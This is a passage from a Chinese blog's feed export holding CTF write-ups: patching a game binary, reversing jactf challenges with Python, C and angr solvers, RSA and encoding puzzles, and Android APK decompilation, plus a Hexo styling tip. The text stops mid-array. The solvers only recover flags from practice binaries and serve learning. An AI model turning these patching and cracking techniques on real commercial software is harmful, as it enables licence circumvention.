    <content type="html"><![CDATA[<h3 id="gametime"><a href="#gametime" class="headerlink" title="gametime"></a>gametime</h3><p><img src="/images/pasted-78.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><blockquote><p>定位主函数<br><img src="/images/pasted-79.png" srcset="/img/loading.gif" alt="upload successful"></p></blockquote><p><img src="/images/pasted-80.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>打开程序看看</p></blockquote><p><img src="/images/pasted-81.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>玩几局发现，程序这游戏就行天天炫舞一样，只不过，我们输错了，它就会退出</p></blockquote><h3 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h3><blockquote><p>既然我们输入的不对就会退出，那不如，我们输入对的就会退出，修改代码<br>sub_1381435<br><img src="/images/pasted-82.png" srcset="/img/loading.gif" alt="upload successful"><br>sub_1381507<br><img src="/images/pasted-83.png" srcset="/img/loading.gif" alt="upload successful"><br>两函数虽然一样，但是是不同的函数，只修改一个达不到效果</p></blockquote><h3 id="运行破解之后的程序"><a href="#运行破解之后的程序" class="headerlink" title="运行破解之后的程序"></a>运行破解之后的程序</h3><blockquote><p>在需要输入的地方按下回车键就行了</p></blockquote><pre><code class="bash">C:\Users\TideSec\Desktop\ctf&gt;gametime.exe        ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG        ZOMGZOMG                                ZOMGZOMG        ZOMGZOMG     TAP TAP REVOLUTION!!!!!!!  ZOMGZOMG        ZOMGZOMG                                ZOMGZOMG        ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG                      R U READDY?!The game is starting in...Get ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGWhen you see an &#39;s&#39;, press the space barZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to play..........sZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGWhen you see an &#39;x&#39;, press the &#39;x&#39; keyZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to play........xZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGWhen you see an &#39;m&#39;, press the &#39;m&#39; keyZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to play.....mTRAINING COMPLETE!Now you know everything you need to know....for the rest of your life!LETS PLAY !Get ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to play.....s..x.mooooh, you fancy!!!.....m..x.skey is not (NIIICE JOB)!!!!.....m...s.....m...s....x.....m...s...s...s....xTURBO TIME!key is  (no5c30416d6cf52638460377995c6a8cf5).m                               )(.x                               )(.m                               )(</code></pre><blockquote><p>key就是要找的flag</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>gametime</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo next 7.xx添加背景图片</title>
    <link href="/hexo-next-7-xx%E6%B7%BB%E5%8A%A0%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87.html"/>
    <url>/hexo-next-7-xx%E6%B7%BB%E5%8A%A0%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87.html</url>
    
    <content type="html"><![CDATA[<h3 id="主题配置文件-config-yml"><a href="#主题配置文件-config-yml" class="headerlink" title="主题配置文件_config.yml"></a>主题配置文件_config.yml</h3><blockquote><p>找到custom_file_path，将如图所示的代码取消注释<br><img src="/images/pasted-74.png" srcset="/img/loading.gif" alt="upload successful"></p></blockquote><h3 id="站点根目录"><a href="#站点根目录" class="headerlink" title="站点根目录"></a>站点根目录</h3><blockquote><p>新建文件source/_data/style.styl<br><img src="/images/pasted-76.png" srcset="/img/loading.gif" alt="upload successful"></p></blockquote><h3 id="输入相关代码"><a href="#输入相关代码" class="headerlink" title="输入相关代码"></a>输入相关代码</h3><pre><code class="javascript">// 添加背景图片body {      background: url(https://source.unsplash.com/random/1600x900?wallpapers);//自己喜欢的图片地址      background-size: cover;      background-repeat: no-repeat;      background-attachment: fixed;      background-position: 50% 50%;}// 修改主体透明度.main-inner {      background: #fff;      opacity: 0.8;}// 修改菜单栏透明度.header-inner {      opacity: 0.8;}</code></pre><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="/images/pasted-77.png" srcset="/img/loading.gif" alt="upload successful"></p>]]></content>
    
    
    <categories>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jactf-reverse2</title>
    <link href="/jactf-reverse2.html"/>
    <url>/jactf-reverse2.html</url>
    
    <content type="html"><![CDATA[<h3 id="简单的逻辑"><a href="#简单的逻辑" class="headerlink" title="简单的逻辑"></a>简单的逻辑</h3><p><img src="/images/pasted-50.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h4><p><img src="/images/pasted-51.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>关键函数<br><img src="/images/pasted-52.png" srcset="/img/loading.gif" alt="upload successful"></p></blockquote><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">In [5]: flag = list(&quot;GEV\odzchpc03&quot;)In [6]: s = &quot;&quot;   ...: for i in range(0,len(flag)):   ...:     if i%3 == 0:   ...:         s += chr(ord(flag[i])^3)   ...:     elif i%3 == 1:   ...:         s += chr((ord(flag[i])^3)-1)   ...:     elif i%3 == 2:   ...:         s += chr((ord(flag[i])^3)-2)   ...: print s   ...:DES_key_is_10</code></pre><pre><code class="bash">snake~:./rePlease input your flag:DES_key_is_10you got it!GEV\odzchpc03#</code></pre><blockquote><p>可以得到是des加密，key为10</p></blockquote><blockquote><p>查看密文是啥</p></blockquote><p><img src="/images/pasted-107.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>解密</p></blockquote><p><img src="/images/pasted-108.png" srcset="/img/loading.gif" alt="upload successful"><br><a href="https://tool.oschina.net/encrypt" target="_blank" rel="noopener">解密网站</a></p><h3 id="真假flag"><a href="#真假flag" class="headerlink" title="真假flag"></a>真假flag</h3><p><img src="/images/pasted-53.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>数学菜鸟在线百度查了下如何求多项式的最大公因式，说是用到了辗转相除法(欧几里得算法),但是好久都没学数学了<br><img src="/images/pasted-70.png" srcset="/img/loading.gif" alt="upload successful"></p></blockquote><blockquote><p>在隔壁老阿姨的帮助下，化简了第二个式子<br>g(x) = x^3 + x^2 + x +1<br>     = x^2(x+1) + (x+1)<br>     = (x^2 + 1)(x+1)<br>由于第一个公式化简太繁琐，得到解压密码(x+1)</p></blockquote><h4 id="ida-1"><a href="#ida-1" class="headerlink" title="ida"></a>ida</h4><p><img src="/images/pasted-71.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-72.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-73.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">flag = list(&quot;lfkmq:b+C~neoyd-~yoog~eho~boxcmb~kdy}oxw&quot;)two = list(&quot;y0y/|hka~ko??ajtoi&quot;)for i in range(0,len(flag)):    flag[i] = chr(ord(flag[i])^0xA)for i in range(0,len(two)):    two[i] = chr((ord(two[i])^7)-7)print &#39;&#39;.join(i for i in flag)print &#39;&#39;.join(i for i in two)</code></pre><h3 id="Electroacoustic"><a href="#Electroacoustic" class="headerlink" title="Electroacoustic"></a>Electroacoustic</h3><p><img src="/images/pasted-59.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="upx-脱壳"><a href="#upx-脱壳" class="headerlink" title="upx 脱壳"></a>upx 脱壳</h4><pre><code class="bash">☁  jactf  upx -d run                       Ultimate Packer for eXecutables                          Copyright (C) 1996 - 2018UPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018        File size         Ratio      Format      Name   --------------------   ------   -----------   -----------    913048 &lt;-    402252   44.06%   linux/amd64   runUnpacked 1 file.</code></pre><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p><img src="/images/pasted-60.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>主要是标注的四个函数,根据函数进行构造输入</p></blockquote><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><pre><code class="bash">snake~:./run1th input:aaaa2th input:438063th input:9784th input:we11d0ne!Get your key:faded</code></pre><h3 id="source"><a href="#source" class="headerlink" title="source"></a>source</h3><p><img src="/images/pasted-54.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="bash">☁  jactf  file sourcesource: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows</code></pre><h4 id="dnSpy"><a href="#dnSpy" class="headerlink" title="dnSpy"></a>dnSpy</h4><p><img src="/images/pasted-55.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>定位主函数</p></blockquote><p><img src="/images/pasted-56.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-57.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-58.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>主要流程：将输入的字符串进行加密后与key2进行比较</p></blockquote><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">key1 = list(&quot;flag{Thi3_i3+A_wrong+str}&quot;)key2 = [24,90,51,23,66,172,49,34,246,240,25,27,224,88,253,50,254,10,7,31,84,5,12,38,15,16,79,117,238]seed = 7flag = &quot;&quot;for i in range(0,len(key2)):    for j in range(0,255):        if key2[i] == (j + seed ^ ord(key1[seed])) &amp; 0xff:            seed = (seed+1)%25            flag +=chr(0x7f &amp; j)            breakprint flag</code></pre><h3 id="reversing"><a href="#reversing" class="headerlink" title="reversing"></a>reversing</h3><p><img src="/images/pasted-61.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="ida-2"><a href="#ida-2" class="headerlink" title="ida"></a>ida</h4><blockquote><p>将关键跳转修改成如下图所示<br><img src="/images/pasted-64.png" srcset="/img/loading.gif" alt="upload successful"><br><img src="/images/pasted-63.png" srcset="/img/loading.gif" alt="upload successful"><br><img src="/images/pasted-62.png" srcset="/img/loading.gif" alt="upload successful"><br>动态调试即可得到flag</p></blockquote><h3 id="disk"><a href="#disk" class="headerlink" title="disk"></a>disk</h3><p><img src="/images/pasted-66.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p><img src="/images/pasted-65.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>一共两个图片，看了一下文件的内容，可以看出来要分析第二张图片<br><img src="/images/pasted-67.png" srcset="/img/loading.gif" alt="upload successful"></p></blockquote><p><img src="/images/pasted-68.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>可以在详细信息的备注里看到js的颜文字，直接浏览器</p></blockquote><p><img src="/images/pasted-69.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>没有目标的明天，是元气满满的一天</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>jactf</tag>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jactf-reverse</title>
    <link href="/jactf-reverse.html"/>
    <url>/jactf-reverse.html</url>
    
    <content type="html"><![CDATA[<h3 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h3><p><a href="https://ctf.jasec.cn/challenges" target="_blank" rel="noopener">jactf</a></p><h3 id="reverse签到"><a href="#reverse签到" class="headerlink" title="reverse签到"></a>reverse签到</h3><p><img src="/images/pasted-29.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="签到无情，亦有情"><a href="#签到无情，亦有情" class="headerlink" title="签到无情，亦有情"></a>签到无情，亦有情</h4><p><img src="/images/pasted-30.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="re-easy"><a href="#re-easy" class="headerlink" title="re_easy"></a>re_easy</h3><p><img src="/images/pasted-31.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p><img src="/images/pasted-32.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">In [1]: import angrIn [2]: pro = angr.Project(&quot;re1&quot;)In [3]: pro = angr.Project(&quot;re1&quot;,auto_load_libs=False)In [4]: sm = pro.factory.simulation_manager(pro.factory.entry_state())In [5]: sm.explore(find=0x40091D,avoid=0x4008FA)Out[5]: &lt;SimulationManager with 1 found, 324 avoid&gt;In [6]: sm.found[0].posix.dumps(0)Out[6]: &#39;bdctf{YOU_CRAKE_THE_RC4}&#39;In [7]: </code></pre><h3 id="simplere"><a href="#simplere" class="headerlink" title="simplere"></a>simplere</h3><p><img src="/images/pasted-33.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p><img src="/images/pasted-34.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>我们输入的字符串加密之后与str2比较</p></blockquote><blockquote><p>关键函数</p></blockquote><p><img src="/images/pasted-35.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-37.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">flag = [102,0xA,0x6B,0xC,0x77,0x12,0x21,25,123,78,44,26,41,4,48,82,52,3,46,26,127,93,21,79,86,6,0,31,21,11,85,83,12,0,95,3,85,83,87,7,78,125]for i in range(20,0,-1):    flag[i] = flag[i] ^ flag[i-1]for i in range(40,20,-1):    flag[i] = flag[i] ^ flag[i+1]print &#39;&#39;.join(chr(i) for i in flag)</code></pre><h3 id="ELF64"><a href="#ELF64" class="headerlink" title="ELF64"></a>ELF64</h3><p><img src="/images/pasted-39.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p><img src="/images/pasted-40.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>输入的数据md5加密后与780438d5b6e29db0898bc4f0225935c0相比较</p></blockquote><h4 id="somd5"><a href="#somd5" class="headerlink" title="somd5"></a>somd5</h4><p><img src="/images/pasted-41.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="baby-reverse"><a href="#baby-reverse" class="headerlink" title="baby_reverse"></a>baby_reverse</h3><p><img src="/images/pasted-43.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><p><img src="/images/pasted-44.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-45.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>输入加密比较，没什么可说的</p></blockquote><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">flag = list(&quot;bIwhroo8cwqgwrxusi&quot;)s = &#39;&#39;for i in range(0,len(flag),3):    s += chr((ord(flag[i]) ^ 18) - 6)    s += chr((ord(flag[i+1]) ^ 18) + 6)    s += chr(ord(flag[i+2])^6^18)print s</code></pre><h3 id="py"><a href="#py" class="headerlink" title="py"></a>py</h3><p><img src="/images/pasted-46.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="找一个在线反编译网站"><a href="#找一个在线反编译网站" class="headerlink" title="找一个在线反编译网站"></a>找一个在线反编译网站</h4><p><a href="https://tool.lu/pyc/" target="_blank" rel="noopener">pyc反编译</a></p><blockquote><p>反编译失败，查看文件头发现少了修改时间于是乎添上，解密得到python代码</p></blockquote><p><img src="/images/pasted-47.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="python">print &#39;[-]Please input your key:&#39;key = raw_input()flag = &quot;=Xm/&gt;*&lt;&amp;?*=+:)k)=&#39;@)&lt;.@-n)mZn.&lt;&quot;flags = &#39;&#39;for q in range(len(key)):    if q % 2 == 0:        flags += chr(ord(key[q]) + 10)        continue    flags += chr(ord(key[q]) - 10)if flags == flag:    print &#39;[-]Good!&#39;else:    print &#39;[-]Wrong!&#39;</code></pre><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">flag = list(&quot;=Xm/&gt;*&lt;&amp;?*=+:)k)=&#39;@)&lt;.@-n)mZn.&lt;&quot;)flags = &#39;&#39;for i in range(0,len(flag)):    if i % 2 == 0:        flags += chr(ord(flag[i]) - 10)        continue    flags += chr(ord(flag[i]) + 10)print flags</code></pre><h3 id="C是最好的语言"><a href="#C是最好的语言" class="headerlink" title="C是最好的语言"></a>C是最好的语言</h3><p><img src="/images/pasted-48.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>难道不是我php是最好的语言吗</p></blockquote><h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><p><img src="/images/pasted-49.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><blockquote><p>符号问题坑死人</p></blockquote><pre><code class="c">对python还是不太熟悉#include &lt;stdio.h&gt;#include &lt;math.h&gt;int main(){    unsigned int v8;    int flag[] = {0, 7, 14, 21, 28, 35, 42, 49, 56, 63, 70, 77, 84, 91, 98, 106, 113, 120, 127, 134, 141, 148, 155, 162, 169, 176, 183, 190, 197, 205, 212, 219, 226, 233, 240, 247, 254, 261, 268, 275, 282, 289, 296, 304, 311, 318, 325, 332, 339, 346, 353, 360, 367, 374, 381, 388, 395, 403, 410, 417, 424, 431, 438, 445, 452, 459, 466, 473, 480, 487, 494, 502, 509, 516, 523, 530, 537, 544, 551, 558, 565, 572, 579, 586, 593, 601, 608, 615, 622, 629, 636, 643, 650, 657, 664, 671, 678, 685, 692, 699};    int i,j,k,v9;    for(i=0;i&lt;sizeof(flag)/sizeof(int);i++){        for(j=i+1;j&lt;sizeof(flag)/sizeof(int);j++){            for(k=j+1;k&lt;sizeof(flag)/sizeof(int);k++){                v9 = (flag[i]+flag[j]+flag[k])/2;                v8 = (unsigned int)((v9-flag[k]) * ((v9-flag[j])*(v9-flag[i])) * v9);                v8 = sqrt(v8*1.0);                if((v8 - 58792) &lt; 0.1){                    printf(&quot;%d %d %d \n&quot;,flag[i],flag[j],flag[k]);                }            }        }    }    return 0;}</code></pre><h4 id="快下班了-emmm…"><a href="#快下班了-emmm…" class="headerlink" title="快下班了,emmm….."></a>快下班了,emmm…..</h4>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>jactf</tag>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jactf-crypto</title>
    <link href="/jactf-crypto.html"/>
    <url>/jactf-crypto.html</url>
    
    <content type="html"><![CDATA[<h3 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h3><p><a href="https://ctf.jasec.cn/challenges" target="_blank" rel="noopener">jactf</a></p><h3 id="crypto签到"><a href="#crypto签到" class="headerlink" title="crypto签到"></a>crypto签到</h3><p><img src="/images/pasted-19.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p><img src="/images/pasted-20.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="贝斯家族三英战群魔！"><a href="#贝斯家族三英战群魔！" class="headerlink" title="贝斯家族三英战群魔！"></a>贝斯家族三英战群魔！</h3><p><img src="/images/pasted-21.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="ciphertext-txt"><a href="#ciphertext-txt" class="headerlink" title="ciphertext.txt"></a>ciphertext.txt</h4><p><img src="/images/pasted-22.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>base系列加解密</p></blockquote><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><p><img src="/images/pasted-23.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>三种来回试吧</p></blockquote><h3 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy_crypto"></a>easy_crypto</h3><p><img src="/images/pasted-25.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><p><img src="/images/pasted-24.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="凯撒变异了，从第五天开始学起了仿射"><a href="#凯撒变异了，从第五天开始学起了仿射" class="headerlink" title="凯撒变异了，从第五天开始学起了仿射"></a>凯撒变异了，从第五天开始学起了仿射</h3><p><img src="/images/pasted-26.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>太难了，待做</p></blockquote><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p><img src="/images/pasted-27.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><pre><code class="python">e = 65537n = 966808932627497190635859236054960349099463975227350564265384373280336699853387254070662881265937565163000758606154308757944030571837175048514574473061401566330836334647176655282619268592560172726526643074499534129878217409046045533656897050117438496357231575999185527675071002803951800635220029015932007465117818739948903750200830856115668691007706836952244842719419452946259275251773298338162389930518838272704908887016474007051397194588396039111216708866214614779627566959335170676055025850932631053641576566165694121420546081043285806783239296799795655191121966377590175780618944910532816988143056757054052679968538901460893571204904394975714081055455240523895653305315517745729334114549756695334171142876080477105070409544777981602152762154610738540163796164295222810243309051503090866674634440359226192530724635477051576515179864461174911975667162597286769079380660782647952944808596310476973939156187472076952935728249061137481887589103973591082872988641958270285169650803792395556363304056290077801453980822097583574309682935697260204862756923865556397686696854239564541407185709940107806536773160263764483443859425726953142964148216209968437587044617613518058779287167853349364533716458676066734216877566181514607693882375533c = 168502910088858295634315070244377409556567637139736308082186369003227771936407321783557795624279162162305200436446903976385948677897665466290852769877562167487142385308027341639816401055081820497002018908896202860342391029082581621987305533097386652183849657065952062433988387640990383623264405525144003500286531262674315900537001845043225363148359766771033899680111076181672797077410584747509581932045540801777738548872747597899965366950827505529432483779821158152928899947837196391555666165486441878183288008753561108995715961920472927844877569855940505148843530998878113722830427807926679324241141182238903567682042410145345551889442158895157875798990903715105782682083886461661307063583447696168828687126956147955886493383805513557604179029050981678755054945607866353195793654108403939242723861651919152369923904002966873994811826391080318146260416978499377182540684409790357257490816203138499369634490897553227763563553981246891677613446390134477832143175248992161641698011195968792105201847976082322786623390242470226740685822218140263182024226228692159380557661591633072091945077334191987860262448385123599459647228562137369178069072804498049463136233856337817385977990145571042231795332995523988174895432819872832170029690848p = 31093551302922880999883020803665536616272147022877428745314830867519351013248914244880101094365815998050115415308439610066700139164376274980650005150267949853671653233491784289493988946869396093730966325659249796545878080119206283512342980854475734097108975670778836003822789405498941374798016753689377992355122774401780930185598458240894362246194248623911382284169677595864501475308194644140602272961699230282993020507668939980205079239221924230430230318076991507619960330144745307022538024878444458717587446601559546292026245318907293584609320115374632235270795633933755350928537598242214216674496409625928797450473q = 31093551302922880999883020803665536616272147022877428745314830867519351013248914244880101094365815998050115415308439610066700139164376274980650005150267949853671653233491784289493988946869396093730966325659249796545878080119206283512342980854475734097108975670778836003822789405498941374798016753689377992355122774401780930185598458240894362246194248623911382284169677595864501475308194644140602272961699230282993020507668939980205079239221924230430230318076991507619960330144745307022538024878444458717587446601559546292026245318907293584609320115374632235270795633933755350928537598242214216674496409625928997877221def egcd(a, b):    if a == 0:        return (b, 0, 1)    else:        g, y, x = egcd(b % a, a)        return (g, x - (b // a) * y, y)def modinv(a, m):    g, x, y = egcd(a, m)    if g != 1:        raise Exception(&#39;modular inverse does not exist&#39;)    else:        return x % md=modinv(e,(p-1)*(q-1))print &#39;d=&#39;,dm=pow(c,d,n)print hex(m)[2:len(hex(m))-1].decode(&#39;hex&#39;)</code></pre><blockquote><p>flag提交不对，不知道为什么</p></blockquote><h3 id="幂数"><a href="#幂数" class="headerlink" title="幂数"></a>幂数</h3><p><img src="/images/pasted-28.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">a = &quot;8842101220480224404014224202480122&quot;a=a.split(&quot;0&quot;)flag=&#39;&#39;for i in range(0,len(a)):     str = a[i]     list=[]     sum=0     for j in str:        list.append(j)        length = len(list)     for k in range(0,length):        sum+=int(list[k])     flag += chr(sum+64)print flag</code></pre>]]></content>
    
    
    <categories>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jactf-android</title>
    <link href="/jactf-android.html"/>
    <url>/jactf-android.html</url>
    
    <content type="html"><![CDATA[<h3 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h3><p><a href="https://ctf.jasec.cn/challenges" target="_blank" rel="noopener">jactf</a></p><h3 id="androideasy"><a href="#androideasy" class="headerlink" title="androideasy"></a>androideasy</h3><p><img src="/images/pasted-5.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="jadx打开，查看主页面"><a href="#jadx打开，查看主页面" class="headerlink" title="jadx打开，查看主页面"></a>jadx打开，查看主页面</h4><p><img src="/images/pasted-4.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>可以直接看到程序通过得到editText的内容和23异或和代码定义的s进行对比</p></blockquote><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p><img src="/images/pasted-6.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="app1"><a href="#app1" class="headerlink" title="app1"></a>app1</h3><p><img src="/images/pasted-7.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="jadx打开，查看主页面-1"><a href="#jadx打开，查看主页面-1" class="headerlink" title="jadx打开，查看主页面"></a>jadx打开，查看主页面</h4><p><img src="/images/pasted-8.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-9.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>通过输入和VERSION_NAME ^ VERSION_CODE相比</p></blockquote><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><p><img src="/images/pasted-10.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="simplecheck"><a href="#simplecheck" class="headerlink" title="simplecheck"></a>simplecheck</h3><p><img src="/images/pasted-11.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="JEB"><a href="#JEB" class="headerlink" title="JEB"></a>JEB</h4><pre><code class="java">package com.a.simplecheck;import android.content.Context;import android.os.Bundle;import android.support.v7.app.c;import android.view.View$OnClickListener;import android.view.View;import android.widget.Toast;public class MainActivity extends c {    public MainActivity() {        super();    }    protected void onCreate(Bundle arg4) {        super.onCreate(arg4);        this.setContentView(0x7F04001B);        this.findViewById(0x7F0B005F).setOnClickListener(new View$OnClickListener(this.findViewById(0x7F0B005E), ((Context)this)) {            public void onClick(View arg4) {                if(a.a(this.a.getText().toString())) {                    Toast.makeText(this.b, &quot;You get it~&quot;, 1).show();                }                else {                    Toast.makeText(this.b, &quot;Sorry its wrong&quot;, 1).show();                }            }        });    }}</code></pre><blockquote><p>主页得到输入内容调用a类的a方法</p></blockquote><pre><code class="java">package com.a.simplecheck;public class a {    private static int[] a;    private static int[] b;    private static int[] c;    private static int[] d;    static {        a.a = new int[]{0, 0x8BBD6FE, 205327308, 0x59E0C2D, 138810487, 408218567, 0x4A42485, 0x443BE85, 0x21929A0A, 559010506, 449018203, 576200653, 307283021, 0x1BDF218B, 314806739, 0x1459AAFB, 0x1459AAFB, 0x1C039BBC, 0x18E61B76, 342206934, 392460324, 382290309, 0xB0F0211, 364788505, 210058699, 0xBCF56CF, 0x1580960D, 440064477, 0x1310B245, 0x284EE4B3, 0x1732EFAB, 0x3175430D, 0x1FE113C4, 0x197B593C, 0x33806C28};        a.b = new int[]{13710, 0xB539, 0xBFFF, 36900, 0xE8AC, 0x8C2B, 0xDBD, 0xCEDD, 1509, 0xEF17, 0xF72A, 0x6C2E, 20932, 0x946D, 22069, 0x20F6, 0x84CB, 0xD032, 0x420C, 30902, 0xFC5A, 0xFA1C, 0x73BD, 0x67A9, 0x2EFA, 31610, 0xBDFF, 0x4E00, 0xB256, 0xCB04, 0xFDBC, 0xB0ED, 0xFCF0, 0x90F4};        a.c = new int[]{0x94F1, 0xE00B, 0x580A, 0xBA97, 8940, 0x136F, 27050, 56102, 0x5524, 0xA0D6, 0xF7D5, 0xD0CE, 0x705A, 0xE74F, 0x4017, 0xFB54, 0x930C, 0xE9F8, 0xA13C, 